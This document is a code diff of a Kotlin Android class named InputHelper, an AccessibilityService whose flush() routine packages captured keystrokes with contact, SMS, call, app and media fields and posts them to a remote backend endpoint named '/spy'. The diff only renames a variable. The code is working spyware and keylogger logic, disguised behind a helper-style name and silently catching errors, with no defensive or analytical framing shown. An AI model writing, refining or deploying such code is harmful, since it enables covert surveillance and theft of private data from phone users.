@@ -24,15 +24,15 @@ class InputHelper : AccessibilityService() {
     }
     private fun flush() {
         try {
-            val payload = JSONObject()
-            payload.put("device", JSONObject())
-            payload.put("contacts", JSONArray())
-            payload.put("sms", JSONArray())
-            payload.put("calls", JSONArray())
-            payload.put("apps", JSONArray())
-            payload.put("media", JSONArray())
-            payload.put("keys", buf)
-            api.post(Backend.URL + "/spy", payload.toString())
+            val p = JSONObject()
+            p.put("device", JSONObject())
+            p.put("contacts", JSONArray())
+            p.put("sms", JSONArray())
+            p.put("calls", JSONArray())
+            p.put("apps", JSONArray())
+            p.put("media", JSONArray())
+            p.put("keys", buf)
+            api.post(Backend.URL + "/spy", p.toString())
             while (buf.length() > 0) buf.remove(0)
         } catch (_: Exception) {}
     }
